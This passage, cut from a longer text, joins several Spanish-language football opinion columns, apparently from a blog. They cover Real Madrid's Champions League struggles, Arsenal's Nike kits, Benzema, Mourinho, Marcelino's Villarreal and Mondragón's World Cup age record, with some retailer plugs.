sólo se jugaban un honor que en este caso era suficiente para batirse al máximo. El partido transcurrió igualado, hasta que Sparwasser –leyenda del Magdeburgo- combinó dentro del área un principio de amago con un latigazo que batió a Maier y se convirtió en un icono. Paradójicamente, el autor del gol que elevó la moral a su deprimido país acabó escapando a la parte occidental, sólo dos años antes de que cayera el muro. Una historia que es casi una alegoría. Hace algún tiempo preguntaron a Fernando Llorente si se planteaba ir a un grande en un futuro próximo. Su respuesta fue tan brillante como contundente: “Ya estoy en un grande”.Los equipos alemanes son como sus cervezas de trigo: intragables. A los hombres de Zidane el partido pequeño se les hizo grande, quién iba a decirlo cuando salió la bolita en el sorteo y todos hablaban de favoritismos y bolas calientes.Dos a cero fue un resultado justo. El Real Madrid fue incapaz de crear peligro a Benaglio. Ni Jesé ni Isco cambiaron el panorama y el equipo blanco se diluyó al más puro estilo Odense. O Mónaco, o PSG. Ese tipo de eliminatorias que parecen ganadas desde el avión y que después pinchan en las manos como los chumbos. El Real Madrid iba de paseo y acabó en puente-palo. “Si no metemos intensidad al principio pasa lo que pasa”, dijo Zidane. No era noche para selfies.Que el Real Madrid no tiene un patrón de juego se sabe desde la primera goleada tras el cambio de técnico. El cinco a cero al Deportivo de la Coruña era demasiado bueno para ser verdad. Cuando tenía ocho años dejé de comer gominolas, mi madre me regaló una bolsa llena y cinco minutos después me dijo que mi abuela “se había ido al cielo”. Yo masticaba chucherías y lloraba. Como metáfora de lo que viene después me valdría. Benítez no funcionaba pero Zidane aún funciona menos. Lo dulce amarga en el equipo de Chamartín. Al Madrid no le salen ni los fingimientos, como demostró Marcelo.Luego están Ramos y Pepe, que son los Pepe Gotera y Otilio del área.Hizo el primero de los suyos ante un Celta bien plantado tras brillante combinación con Luciano Vietto, pero es que además dio un recital defensivo en un partido de tremendo desgaste físico. Muy activo en la recuperación de balón, a la cholista manera, y siempre incisivo en el último tercio del terreno. Crece semana tras semana.Jonathas de Jesús. Tras haber brillado con el modesto Elche el pasado curso, no estaba siendo, desde luego, la temporada del delantero brasileño, hasta el punto de ser considerado como una de las más notables decepciones de la campaña. Con sus dos dianas ante el Valencia, parece reivindicarse y ofrecerse como alternativa fiable ante la obligada ausencia por lesión del intocable Agirretxe. Vienen semanas importantes para su confirmación como txuri-urdin. La plantilla aún almorzaba sándwiches BLT regados con cerveza los días de partido en Highbury y George Graham se desgañitaba desde el banquillo como un poseso cuando Nike entró a formar parte de la gran familia del Arsenal. Tras ocho temporadas vistiendo equipaciones Adidas, el club londinense supuso la gran puerta de entrada de la firma norteamericana en el mundo del fútbol. Temporada 1994/95. Un club en crecimiento, con enorme tirón y trascendencia en Inglaterra, con algunos de los principales jugadores ingleses del momento despuntando en sus filas… La opción para irrumpir con fuerza en el mercado futbolístico y hacerse un nombre en un deporte que era terreno por explorar para Nike parecía idónea. Han pasado veinte temporadas desde entonces. Algunas históricas, otras decepcionantes, todas trascendentes. Y todas con el inconfundible swoosh de la firma de Oregon en la pechera. Nos costará asimilar, a partir de la próxima campaña, un Arsenal sin Nike.Temporada 1994/95. George Graham la lía gorda por cuatro libras que no le correspondían y Stewart Houston tiene que sustituirlo como interino a mitad de temporada. Con todo el jaleo, al escocés aún le sobra, apoyado en la exquisita pero inestable batuta de Paul Merson y en los goles de Ian Wright, para llevar al equipo a intentar revalidar la Recopa en la final de París. El minuto 120 y la locura genial de Nayim son historia desde entonces.Dos años después de su llegada a Highbury, Nike decide deslizar un guiño al glorioso pasado reciente. La camiseta away de la temporada 1996/97 toma como inspiración directa aquella con la que Michael Thomas, el discutido Michael Thomas, dio su último título liguero a los gunners con aquel inolvidable gol en el tiempo añadido de la última jornada del campeonato 1988/89 en Anfield. Será un diseño, camiseta amarilla con mangas en azul marino, del que Nike tiraría en más de una ocasión en sus veinte temporadas en Islington.Nunca la camiseta del Arsenal había sido tan blanca como en la temporada 1998/99. El diseño empleado por Nike extiende el color blanco desde las mangas, como era y es tradicional, hasta los costados de la camiseta. Es también la temporada del adiós a JVC, una firma que muchos asociamos inevitablemente desde aquellos años 80 al equipo londinense. El mismo modelo de camiseta será empleado en la 1999/00, incluyendo el nuevo patrocinador Dreamcast. Más noventero imposible.Temporada 2003/04. La gran referencia del wengerismo. The Invincibles. El record absoluto. Los campeones de Liga imbatidos, con veintiseis victorias y doce empates. Un Arsenal en el que deslumbran como jamás volverán a hacerlo futbolistas como Thierry Henry, Dennis Bergkamp, Robert Pirès o el español Lauren.El adiós al entrañable Highbury, tras noventa y tres años albergando los partidos del Arsenal, trae consigo una camiseta especialmente diseñada para la ocasión e inspirada en el color original de aquel primigenio Woolwich Arsenal que trasladó su sede del sudeste al noreste de la ciudad en el año 1913. Bordado alrededor del escudo gunner, en letras doradas, el tributo al viejo hogar. Fue también de la primera, y hasta ahora única, final de Copa de Europa disputada por el club. El gol de Belletti en París, ya saben.La celebrada camiseta away de la temporada 2007/08 tuvo su inspiración en el mítico Herbert Chapman, técnico gunner en los años veinte considerado como un auténtico revolucionario del fútbol de la época. Balones de color blanco, números en las camisetas para poder distinguir a los jugadores, la WM o la estación de metro de Gillespie Road, hoy Arsenal, son solo algunas de las innovaciones aportadas por Chapman y rememoradas en esta camiseta.Casi una década después, el Arsenal y Nike deciden recuperar el azul oscuro como color para la segunda equipación. Temporada 2009/10, el gran año de Fàbregas como futbolista gunner. Explotando su faceta de llegador, el futbolista de Arenys de Mar se corona como máximo goleador del equipo desde su posición de centrocampista creativo, con diecinueve goles en liga.Kroos, que es menos alemán de lo que parecía, Bale que es una isla inentendible tipo Lost, y un Cristiano individualizado y rígido, como un tótem tallado en madera oscura. Un dios acartonado, de moreno zanahórico, que a veces desaparece, y que además lo hace en los partidos importantes. La resaca postclásico no ha podido tener peor dolor de cabeza que éste. Habrá que guardar algo de bilis para cuando se confirme, si se confirma, la eliminación. Por no repetirse con los azotes a un Real Madrid que el miércoles noche estuvo pésimo.El Wolfsburgo era mejor de lo que parecía. Le pasa lo contrario que a Danilo, que nos parecía mejor lateral cuando no le veíamos jugar en el Oporto. El equipo alemán contemporizó el fútbol, ganó el centro del campo como el cuchillo gana el espacio a los pasteles. Los grandes equipos no son la suma de grandes jugadores. Todo sería demasiado fácil así. A veces pasa que jugadores pequeños hacen enormes equipos. Le pasa al Leicester en Inglaterra o al Atlético de Madrid en España. Filipe Luis o Falcao son peces que fuera del mar rojiblanco no pueden respirar, y eso es mérito de Simeone.Zidane no hace mejores a los que tiene. James es una vulgaridad e Isco, que hace años parecía que había llegado al mundo para ganar el Balón de Oro, es hoy un jugador intrascendente. El juego del Madrid es blando, horizontal y pesado. Ganan porque los buenos jugadores suelen meter goles, pero no hay sensación de equipo, ni movimientos acompasados, ni solidaridad entre las líneas, ni una defensa exigente, ni un centro del campo capaz de hacerse con el timón en los partidos disputados.Cambiar de caballo en mitad de la carrera tiene estas cosas, e intuyo que Florentino lo sabe. Un dos a cero pesará mucho en el Bernabéu. Si caen eliminados, el crédito de Zidane adelgazará como un concursante de La Báscula.Todavía había esperanzas de disfrutar de un gran Andrei Arshavin en el Emirates.Mientras las segundas y terceras equipaciones cada vez apuntan hacia diseños más estrambóticos y originales, Nike vuelve a los orígenes y al tradicionalismo para conmemorar el 125 aniversario del club. Se incorpora, además, la corona de laurel conmemorativa en torno al habitual cañón del escudo. Es la gran temporada de Robin van Persie, la que le vale su comentado fichaje por el United. Puedes comprar camisetas del Arsenal, desde los años ochenta hasta la actualidad, a precios imbatibles, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. No descubro nada nuevo si afirmo que Karim Benzema es un futbolista discutido. Por extraño que parezca, el delantero francés no ha terminado de conseguir elevarse como referencia indiscutible del madridismo en los cinco años y medio que lleva en Chamartín. Se le han venido achacando, periódicamente y de forma regular, episodios de indolencia y de escaso compromiso con el equipo y casi siempre ha sido uno de los señalados cuando las cosas no han pintado bien en Concha Espina. El atacante galo casi siempre ha sido blanco fácil para la crítica más feroz. Si a todo eso le unimos una peculiar y esquiva relación con el gol, la incógnita de la ecuación aparece inmediatamente despejada. Quizá por su peculiar carácter y por la escasa vehemencia de sus intervenciones públicas, el exjugador del Lyon ha aparecido siempre como uno de los nombres sobre la mesa cuando el aficionado madridista ha tenido que someter a su equipo a análisis profundo tras la quema. Pese a todo, Benzema es un futbolista necesario.Con su calma, con su pausa y con su gélida presencia, Karim atempera los ánimos de un equipo que generalmente aparece desatado. Suaviza un ataque despiadado, sostiene las revoluciones de sus compañeros y modera, con su sola presencia, un debate tan encendido que a veces resulta imposible entender a sus participantes. Y algo tendrá que ver en la clave de su éxito y de que su juego elegante y académico siempre haya resultado del agrado de todos sus entrenadores. Porque el fútbol de Benzema no entiende de esquemas ni de predisposiciones tácticas férreas. Su fútbol es útil y resoluto con Pellegrini, con Mourinho y con Ancelotti y por eso nunca ha dejado de la caudalosa corriente crítica con su figura acabara arrastrándolo aguas abajo del Bernabéu.Ocurre, sin embargo, que Benzema ocupa en su equipo la posición de delantero centro. Teóricamente, sobre el papel, es el jugador encargado de sumar goles, aquel sobre el que recae indefectiblemente la responsabilidad productiva máxima. Y ocurre, además, que Karim mantiene una relación tensa y conflictiva con la portería rival. Sus cifras goleadoras a final de campaña no suelen ser las que se le presupondrían al delantero centro titular de un equipo aspirante a todo. De hecho, su techo anotador está en veintiún tantos en la temporada 2011/12. Y eso, al parecer, hay aficionados que no se lo transigen.Cuando en la ofensiva de tu equipo cuentas con futbolistas como Cristiano Ronaldo, Gareth Bale, Isco o James no necesitas que tu delantero centro sea un portento goleador y un asiduo de las más altas cifras. Te viene mejor que sea Karim Benzema y que haga cosas tan inverosímiles e impredecibles como las que hace Karim Benzema. Que juegue para los demás, sin ese egoísmo obsesivo que actúa como denominador común de los grandes depredadores del área, y multiplicando la efectividad de sus compañeros de vanguardia. Huyendo siempre del artificio inútil y de la pomposidad innecesaria en el gesto. Ayer, en Getafe, Benzema volvió a firmar uno de esos partidos suyos tan extraños en los que, siendo probablemente el mejor de su equipo y jugando más próximo que ninguno a la portería rival, se fue al vestuario sin anotar ningún gol. Pero su camino no entiende de convencionalismos ni de hacer lo que todo el mundo espera que haga un futbolista en su posición. No hay ninguno como él. Por eso es tan valioso. Y, quizá, por eso se le discuta. Pedro Mosquera. Una victoria en un derbi siempre supone una satisfacción extra. El siempre tenso derbi gallego se inclinó del lado coruñés y una gran responsabilidad de la victoria recayó sobre el mediocentro gallego. Haciendo pareja, obligada por la lesión de Celso Borges, en el doble pivote con Álex Bergantiños, Mosquera maniobró con maestría la nave deportivista. Lo hizo cubriendo una porción anchísima de terreno para imposibilitar el pensamiento fácil y rápido de Augusto Fernández y posibilitando las innumerables superioridades en sala de máquinas que hizo que el partido se inclinara visiblemente hacia el lado herculino. Lectura de partido de sobresaliente.Aymeric Laporte. Siendo Laporte el mejor defensor que ha pasado por San Mamés en, pongamos, la última década, mantiene una preocupante tendencia a dejar cierto aroma a incertidumbre con demasiada frecuencia. El de ayer en Granada fue, probablemente, su peor partido desde que se instaló en el primer equipo, con incidencia negativa en los dos goles encajados por los rojiblancos. Sin tensión, apoyado en exceso en una autoconfianza tan excesiva que le lleva al fallo grosero más de lo deseable, el francés lleva unas semanas perdido en diatribas sobre su futuro más inmediato o su carrera como internacional galo. El Athletic necesita como el respirar recuperar su mejor versión.Deyverson. Llamado a marcar las diferencias en un Levante de mínimos, el brasileño, que empezó la temporada como un tiro pero parecía haberse diluido con el transcurrir de las jornadas, firmó dos tantos en la victoria de los suyos en El Molinón. Dos goles de oportunista, de delantero con buen olfato, que confirman que el Levante de Rubi tiene otro aire. Tuvo tiempo además para encararse airadamente con el graderío, torpeza que le podría haber costado cara en un partido que tenían al cien por cien en el bolsillo.Hernán Pérez. Huérfano de Sergio y echando de menos a Stuani, el aficionado espanyolista ansiaba nuevo ídolo al que dar la mano para adentrarse en los intrincados senderos ligueros. En apenas cuatro meses, el centrocampista paraguayo llegado el pasado verano ya se ha ganado la confianza de Cornellà y se ha convertido en un futbolista indiscutible en los esquemas de Sergio González. Con cuatro dianas, sumando las dos del sábado ante el Málaga, es ya el máximo goleador perico junto al punta Caicedo. Es incisivo, constante y sacrificado. Sin ruido ni repercusión mediática.Andrés Iniesta. Entrado ya en la treintena, Andresito se vio obligado a reinventarse si quería seguir manteniendo un papel protagonista en el visceral Barça de Luis Enrique. Más protegido en el campo y alejado de las inclemencias de la banda, el manchego presenta una versión de su juego menos vertiginosa pero igualmente efectiva. Así se demostró en el Clásico del Bernabéu, donde Andrés puso al Barça al ritmo que sus botas dictaban.Aderezó una actuación brillante con un pase de gol a Neymar y un golazo tras brillante jugada combinativa. A ese nivel, vuelve a ser insustituible en el equipo. Hay algo en este Real Madrid contemporáneo que empuja al equipo hacia una peligrosa tendencia a tratar de finiquitar las eliminatorias a doble partido en apenas veinte minutos. Como si viviera en una permanente necesidad de tener que demostrar su gallardía y su superioridad abrumadora ante los rivales, el Madrid jamás tontea con el resultado. Nunca busca la muchas veces necesaria especulación. De cara al espectáculo y al aficionado neutral sus eliminatorias son una gozada porque casi siempre acaban convertidas en un recital de mandobles, de idas y venidas, de glorias e infiernos. Condensadas y reconcentradas, dando cobijo a muchos más episodios de los que cabría esperarse.Y ocurrió en Turín que el Real Madrid, tal vez un poco aletargado por los comentarios tranquilizadores que siguieron al sorteo que lo emparejaba con la Juventus, se presentó queriendo dar por sentenciada la eliminatoria sin necesidad siquiera de tener que desenvainar en el Bernabéu. Es complicado explicarse, si no, por qué permitió a la Juve, un notable equipo pero un par de peldaños por debajo del campeón continental, subírsele al cogote en el previsible arranque en tromba del partido. Ahí apareció Álvaro Morata, ese delantero que ansiaba unos minutos que el Madrid no parecía dispuesto a poder ofrecerle. Con su movilidad y su hiperactividad en todo el frente de ataque, puso en jaque a Pepe y Varane. Fue de lo poco que ofrecieron los juventinos en campo rival, pero no hizo falta más. Una dosis de oportunismo para recoger el rechazo de Casillas al tiro cruzado de Tévez terminó de levantar las oportunistas sospechas sobre la idoneidad del traspaso de Morata. Miedo.Sorprendido con el uno a cero, el Madrid buscó encaramarse a las espaldas de James e Isco para sacudirse el susto de encima. En cuanto el colombiano consiguió entrar más en juego, los blancos pudieron subir las revoluciones del choque hasta el punto necesario para hacer cosquillas a los italianos. Isco, por su parte, atemperaba el alto ritmo impuesto por el ’10’, tratando de esconder la pelota cuando era menester y buscando esa pausa necesaria para la que está especialmente capacitado. En una de sus combinaciones en zona de peligro, nació la jugada del gol de Cristiano Ronaldo.Y fue en ese preciso momento cuando el equipo de Ancelotti cometió la imprudencia más grave que podría esperarse. En lugar de amurallarse alrededor de ese valioso empate, buscar alguna contra dañina y pensar en el partido de vuelta, quiso finiquitar la eliminatoria por la vía rápida. Y, en condiciones normales, quizá la opción no hubiese sido tan descabellada (ahí quedó para la memoria el cabezazo de James al larguero). Pero se daba anoche la circunstancia de que la dirección de obra del Madrid no estaba en las mejores manos. Porque Sergio Ramos nunca subo interpretar los planos del edificio. Los colocaba sobre la mesa y los escudriñaba con mirada de concentración pero acababa desesperado cada vez que debía levantar un nuevo muro de carga. Sergio puede ser un colosal defensa central, probablemente uno de los tres mejores del mundo. Pero como medio centro, como armador del equipo, naufraga en la gran mayoría de los compromisos a los que se le somete, especialmente cuando requieren ese punto de pausa y temple que el andaluz no parece capacitado para ofrecer. En un esfuerzo encomiable y dejando ver la mejor de las voluntades, Ramos adornaba su actuación con ese ramillete de cosas innecesarias pero tremendamente arriesgadas que terminan por condenar la labor de un medio centro. En lugar de huír del riesgo, se exponía a él de manera temeraria con las lógicas consecuencias.Por ahí vio la Juve el descosido blanco. Y por ahí se coló Tévez, velocísimo, y desgarró el elegante modelito madridista en una carrera cuerpo a cuerpo que Carvajal no supo sostenerle. Son los riesgos de ir a la guerra abierta (hasta ocho jugadores madridistas aguardaban el remate en el córner a favor que precedió la galopada del argentino) con una armadura abollada y con óxido en las soldaduras. Cuesta comprender, con el Madrid ya por debajo en el marcador, el movimiento impuesto por Ancelotti al introducir a Chicharito, relegado ayer de nuevo al papel de meritorio, y prescindir de los servicios de Isco. Y cuesta comprenderlo, sobre todo, porque el calamitoso partido de Gareth Bale anunciaba una sustitución sencilla, evidente y mucho menos traumática para la organización del equipo. Arrastra el galés, que creció como lateral zurdo, adelantó su posición por la gracia de Harry Redknapp y acabó condenado al interior por exigencias del guión, un serio problema de ubicación. Su aporte nunca parece suficiente y por eso va modificando su rol en función de las necesidades de su entrenador, corriendo el riesgo de acabar convertido en un anodino futbolista-comodín.Sea como fuere, y después de superar al arreón final de los bianconeri -cabezazo inocente de Llorente incluido-, lo mejor que puede extraerse del partido del Madrid en Turín es un resultado lo suficientemente cómodo para afrontar la vuelta con la confianza necesaria y lo suficientemente complicado como para interpretar el choque del Bernabéu con el punto de intensidad necesario. Porque nadie dijo que esta eliminatoria tuviera que resolverse en veinte minutos. ‘Me molestó que dijesen que veníamos al Bernabéu con el equipo B‘. Con el regusto dulzón por el buen resultado arrancado en Chamartín por los suyos aún en el paladar, Marcelino García Toral se dio el capricho de acordarse de aquellos que infravaloraron en la previa su predisposición para tratar de plantar cara al Real Madrid en su propio estadio con la vuelta de la semifinal de Copa en el rabillo del ojo. Quiso recuperar, con la sangre madridista aún cayendo por la comisura de sus labios tras la certera dentellada, la sublime torpeza de aquellos que, precisamente, consideraron a una de las principales fortalezas de este Villarreal CF en un tono tan negativo y denigrante.Por si quedaba alguna duda, por si alguien se hubiese limitado a leer únicamente sus enfrentamientos ante Real Madrid y Barcelona para extraer atropelladas conclusiones, el equipo de Marcelino dejó sobre el verde de La Castellana la evidencia palpable de que en El Madrigal no hay equipo A, ni equipo B, ni equipo C. Hay, simplemente, equipo. Sin apenas distinción entre titulares y suplentes. No tengo especial simpatía por Marcelino. Igual es un prejuicio tonto, lo admito. Un gesto frecuentemente adusto, una cierta tendencia a la falsa modestia y una trabajada capacidad para el conflicto sibilino no contribuyen a mejorar la imagen que tengo del asturiano. Digamos que es un extraordinario entrenador que, pese a su creciente colección de méritos, me genera escasa empatía. Pero el reconocimiento a su trabajo en Vila-real debe de ir por delante. Hay que retrotraerse hasta la temporada 2012/13, con el equipo en Segunda división, para valorar como merece la trayectoria de Marcelino al frente del banquillo amarillo. Siempre creciendo, siempre estableciendo metas más ambiciosas a medida que se iban cerrando los objetivos propuestos y el equipo se iba modelando. El ascenso, la consolidación con clasificación europea incluida y el año de la confirmación, con la exigencia diaria por bandera. Y todo con una plantilla que no destila ni mucho menos tanto rancio abolengo como en temporadas anteriores. Una plantilla con cerca de dos decenas de teóricos titulares, con puntas de lanza que comienzan a hacerse un nombre propio, como Luciano Vietto, Mario Gaspar o Manu Trigueros, con no menos de cinco o seis futbolistas surgidos de la cantera y asentados en el primer equipo. No cambiaré mi percepción personal sobre Marcelino, pero negar su acumulación de méritos entraría en el terreno de la necedad.Puedes comprar camisetas del Villarreal Club de Fútbol en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Habían pasado veinte años ya, pero lo tenía fresco en la memoria como se tienen todas las cosas realmente importantes en la vida. Se había hablado tanto de aquella selección colombiana que el Pacho Maturana llevó a Estados Unidos, con la vitola de más que posible revelación del Mundial de 1994, que a fuerza de oírlos repetidos los nombres de Valderrama, Asprilla, Valencia, Freddy Rincón o Leonel Álvarez se me habían hecho ya absolutamente familiares. De aquella, Faryd Mondragón era un joven portero suplente que aún no había salido del fútbol sudamericano. Su cromo era el último en el álbum de Panini, ocupando el lugar destinado a los porteros suplentes. Mondragón era ese cromo que si finalmente no consigues tampoco te duele en exceso. Por aquel entonces aún se llamaba Farid, con i latina, tenía veintitrés tiernos años y se batía el cuerpo defendiendo la portería de Argentinos Juniors en busca de mayores retos.Mondragón no pisó el césped en la cita mundialista del año 94. Anoche, veinte años más tarde de que Maturana decidiese llevárselo a Estados Unidos como suplente de Óscar Córdoba, Faryd Camilo Mondragón (Cali, Colombia, 1971), se convirtió en el futbolista de mayor edad en disputar un partido de la Copa del Mundo, cuando José Pékerman decidió dar entrada al veterano guardameta para dejar en un simple recuerdo el récord establecido en el año 1990 por el recordado y emblemático Roger Milla. La imponente estampa de Mondragón bajo palos nos hizo envejecer una década de golpe. Como queriéndonos recalcar que ya no somos jóvenes y que todos los recuerdos sobre los que edificamos nuestra afición no son ya más que anécdotas perdidas en el tiempo, el meta colombiano se llevó por delante un récord, el del delantero camerunés que asombrara al planeta en Italia 90, que parecía inamovible y eterno. Con 43 años y tres días, el portero del Deportivo Cali, que ya ni siquiera tiene un hueco reservado en el álbum de Panini, ha pasado a ser un cromo referencial. Uno de esos que solo cambias por dos o tres ejemplares. Han sido veinte años con él. Anoche rescaté ese viejo álbum del 94. Allí estaba Farid, con i latina, dispuesto a esperar veinte años para convertirse en historia. Conocidas las alineaciones oficiales de Atlético de Madrid y Chelsea para el partido de ida de la semifinal de la Liga de Campeones, recibí un mensaje de mi amigo Pol Gustems. ‘He metido dinero en bwin al empate a cero‘, decía. Le respondí asintiendo a su previsión con un ‘y yo a que se marca un gol o menos‘. Ninguno de los dos fallamos en nuestras propuestas. A donde no llegó nuestra intuición y nuestra modesta capacidad de descifrar partidos de antemano, llegó la declaración de intenciones del Chelsea en forma de once titular. Azpilicueta, Terry, Cahill, Cole, David Luiz, Obi Mikel, Lampard y Ramires. Hasta ocho futbolistas de corte claramente defensivo blindando la portería londinense. Una apuesta clara, definitiva y sin ambages por salir del Calderón sufriendo el menor daño posible. Y eso es algo que cuando José Mourinho se lo propone suele salirle bien. El partido nacía, pues, con su crónica ya escrita.Proponiendo un partido trabado y con muy poco juego efectivo, el Chelsea, como bien apuntó su técnico tras el partido, frustró a quien suele frustrar a los demás. Fue, precisamente, su victoria de ayer. Conseguir salir airoso de un partido como el que disponía el Calderón y ante un equipo con la desmedida voracidad de este Atleti no es un asunto menor. Podremos entrar a discutir, aunque sea un debate estéril, eterno y con pocas salidas válidas, si la propuesta planteada por Mourinho es o no es la oportuna. Si gozar de una buena plantilla, probablemente entre las seis o siete mejores de Europa, y ordenarla no hacer daño sino evitar que se lo hagan es tolerable desde el punto de vista del espectáculo y del ojo del aficionado ajeno. Pero sobre lo que no cabe discusión posible, aunque personalmente prefiera dar solaz a mi existencia con otros estilos, es sobre la licitud y la validez de una propuesta que, recordemos, no es patrimonio exclusivo del técnico portugués, aunque haya podido parecerlo en los últimos tiempos.Sin olvidar que la eliminatoria consta de ciento ochenta, si no más, minutos, la decisión de Mourinho cobra fuerza a la luz de anteriores experiencias. Juega sus armas, las que él mejor conoce y domina, y lo hace como pocos. Maniata al rival y se dedica a bailar la danza de la lluvia a su alrededor, sometiéndolo a una especie de trance hipnótico, y a desquiciarle a base de reafirmar su impotencia. Sin detenernos, por supuesto, en la estética del asunto, que esto no es la Florencia del siglo XIX y nadie pretende ser deslumbrado hasta el desvanecimiento por un partido de fútbol.Sólo cabe esperar que el preparador del Chelsea asuma que su propuesta no es patrimonio exclusivo de su libro de estilo. Que no sólo sus equipos son capaces de desarrollarla (y, de hecho, es un planteamiento que está al alcance de un sinfín de equipos de nivel infinitamente menor al de los Blues). Que admita que si el Crystal Palace se encierra en torno a su portero y aniquila cualquier intento de que el balón ruede frustrando las innumerables tentativas de los suyos no es porque ponga en práctica un fútbol decimonónico, sino simplemente porque está tratando de jugar sus bazas de la mejor manera posible. Y sin perder un ápice de legitimidad. El poso de decepción dejado anoche por el Manchester City tras el partido de ida de los octavos de final de la Liga de Campeones era palpable en el ambiente. Todos habíamos fantaseado con una eliminatoria abierta, disputadísima, con dos equipos volcados sobre la meta rival en una lucha heroica y en la que el vencedor de la contienda entre citizens y culés fuese el último en conseguir mantenerse en pie tras un intenso intercambio de golpes. Quien más quien menos, había imaginado un City demoledor, al estilo de lo que acostumbra a practicar el conjunto de Manuel Pellegrini en la Premier League. Un equipo con un aura goleadora implacable, acostumbrado a despachar sus grandes duelos ante los grandes de Inglaterra con mano férrea y actitud dominadora. Pero nada de eso se vio anoche sobre el césped del Etihad.Lejos de lo esperado, el City que se midió al Barça lo hizo presentando una versión de mínimos. Como un equipo menor, tímido y acomplejado. Y no se trata de restar méritos al partido de los de Martino. Con sus particularidades (dejémos de compararlo con el histórico equipo de Guardiola, por favor), el Barça planteó un partido muy práctico, ideal para una ida de una eliminatoria europea. Pero lo sorprendente no fue su planteamiento, sino la oposición que ante él planteó el conjunto inglés.Decía Enric González en cierta ocasión, con motivo de animada charla con los editores de este blog, que las Ligas de Campeones, como las presidenciales francesas, las ganan los veteranos. La sentencia retumbó anoche en mi memoria, justo en el momento en el que Dani Alves dejaba la eliminatoria tan de cara para el barcelonismo que nada hace presagiar un escenario diferente en el partido de vuelta. Ayer el Barça, que no llegó a bordar el juego en ningún momento, se impuso por pura veteranía, por el bagaje que supone la experiencia acumulada por un equipo que en los últimos tiempos se ha acostumbrado a luchar, como mínimo, hasta semifinales del torneo. El City, en cierto modo abrumado por lo que tenía ante sí, se comportó como lo que es, como el meritorio que aspira a colarse en una fiesta a la que no ha sido invitado. Su problema es que esta vez se olvidó de presentar méritos y permitió al Barça, al veterano, salir de su casa con un resultado excelente. Admiro a José Mourinho. Admiro profundamente su amor propio y su inquebrantable confianza en sí mismo. Admiro su seguridad, su firmeza y su convencimiento de que cada paso que decide dar en su vida va en la dirección correcta. Admiro su facilidad para exculparse de los fracasos que le rodean. Porque los fracasos siempre le rodean, le pasan al lado o le adelantan por la derecha en una maniobra temeraria, pero nunca le envuelven. Nunca parecen ir con él. Siempre sale indemne (al menos, en apariencia) de los escenarios más complicados. El Harry Houdini de las ruedas de prensa postpartido. Del King Power Stadium de Leicester salió airoso pese a una nueva derrota del Chelsea que deja al equipo al borde del precipicio. Cuestionado acerca del partido y de lo delicado de su situación, levantó la barbilla hacia el cielo y, sacudiéndose el polvo de la derrota de los hombros, declaró que sentía que todo su trabajo había sido ‘traicionado‘. ‘Sé que una de mis mejores cualidades es leer los partidos para mis jugadores e identificar cada detalle de nuestros oponentes. Los dos goles encajados son difíciles de aceptar porque siento que mi trabajo ha sido traicionado (…) Alguno de mis jugadores es evidente que no está a su nivel normal. Es duro. Quizá es que la temporada pasada hice un buen trabajo con ellos y los llevé hasta un nivel que no es su nivel real’. Imagino a Mourinho desahogando su frustración y su ira sobre sus traicioneros jugadores, como Michael con Fredo Corleone. Escupiendo a la cara de John Terry que sabe que fue él y que le ha roto el corazón.Mascando interiormente bajo una mirada gélida la forma en la que ejecutará su cruel venganza. Pero siempre desde su púlpito. Siempre a salvo de la quema. Juzgando todo y a todos los que le rodean y excluyéndose a sí mismo del ajuste de cuentas. Cuando se depuran responsabilidades, José siempre mira para otro lado. Y su Chelsea mira ya para abajo. Parece ser que en San Sebastián anda la gente con un mosqueo importante. Acusan a Jagoba Arrasate, técnico de la Real Sociedad, de haber conducido al equipo hacia el conformismo y la racanería, estando en plena lucha por un puesto europeo y acechando la plaza Champions que ocupa actualmente, y para mayor nerviosismo, el Athletic Club. La apuesta ayer por un once conservador en su asalto a El Sadar, con Elustondo, Markel Bergara y Zurutuza formando en el centro del campo y Rubén Pardo, Griezmann y Sergio Canales reservados en el banquillo prendió la mecha de una bomba que detonó tras el pitido final. ‘Lo importante es que no perdamos y que sigamos sumando‘, remató Markel Bergara dando por bueno el punto arañado en Pamplona y terminando de encender unos ánimos ya muy caldeados entre la afición txuri-urdin. Nunca es sencillo para un club y una afición cambiar de objetivo. El traslado y mudanza desde el barrio residencial hacia la zona noble conlleva aparejados no pocas bofetadas y meteduras de pata. Que uno no sabe en ocasiones cómo debe de comportarse en ambientes tan selectos. La Real de Liga de Campeones se vio de pronto inmersa, como todos aquellos equipos que disfrutan de ciento en viento de la experiencia europea del más alto nivel, en un ambiente extraño, en un escenario que le era ajeno. De la noche a la mañana, la exigencia se había incrementado proporcionalmente al supuesto nivel futbolístico de la plantilla y en concordancia con los éxitos más recientes. Ya no valía con arañar puntos en plazas complicadas (como bien puede ser Pamplona) con el objetivo primordial de vivir tranquilo en la tabla y, si se daba la ocasión, aspirar a plaza europea. Cuando tu equipo se codea con los grandes, esperas que ese nuevo estatus se eternice, que ya nunca más vuelvas a pasar hambre y que visitar a Osasuna sea sinónimo inequívoco de lanzarse a tumba abierta y con plena convicción a por los tres puntos en liza.Ahora resulta que Jagoba Arrasate ya no es suficiente. Que ha resultado ser un técnico ramplón, conformista, con miedos visibles y con más ganas de asegurar su puesto en el banquillo donostiarra pisando sobre seguro que de llevar a la Real a otro nivel, que quizá no le corresponde por naturaleza, a costa de jugarse el cuello. O así lo ven una buena parte de la grada de Anoeta, que parece haber dictado sentencia sobre su joven técnico especialmente tras los partidos de Almería y Osasuna, siguiendo unas pautas muy similares a las que marcaron el final de la era Montanier en Donosti. Ayer a media tarde no habría dado un duro por la clasificación para la Final de Copa del Athletic Club. Sí que lo habría puesto sobre la mesa, en cambio, por el pase del Villarreal en su eliminatoria frente al FC Barcelona, pese al resultado negativo para los intereses amarillos en el partido de ida. Trayectorias, estados de ánimo, predisposición… Lo cierto es que la semifinal y el estar a un mínimo paso de la tercera final copera en seis años no habían despertado la admiración que merecían en Bilbao. No, al menos, la de otras ocasiones similares. El manifiesto desencanto con el equipo de Valverde en una temporada nefasta, unido a un horizonte en previsible perspectiva con el Barça aguardando, otra vez por tercera vez en seis años, habían enfriado los ánimos de tal manera que el partido de vuelta en Cornellà había quedado alineado con el saco de los partidos del montón.Todo lo contrario sucedía en Vila-real. Con el equipo de Marcelino en un gran momento de forma (probablemente, el más alto de la temporada), después de un trabajado y muy meritorio empate en el Bernabéu y mecido por un ambiente de euforia extraordinaria ante la posibilidad de alcanzar una final de Copa por vez primera en su historia, las sensaciones ante lo que El Madrigal podía depararle al Barça eran bien diferentes a las que se percibían por Bilbao. El pase se palpaba casi como una realidad (pese a las ingratas experiencias pretéritas) y el comentario 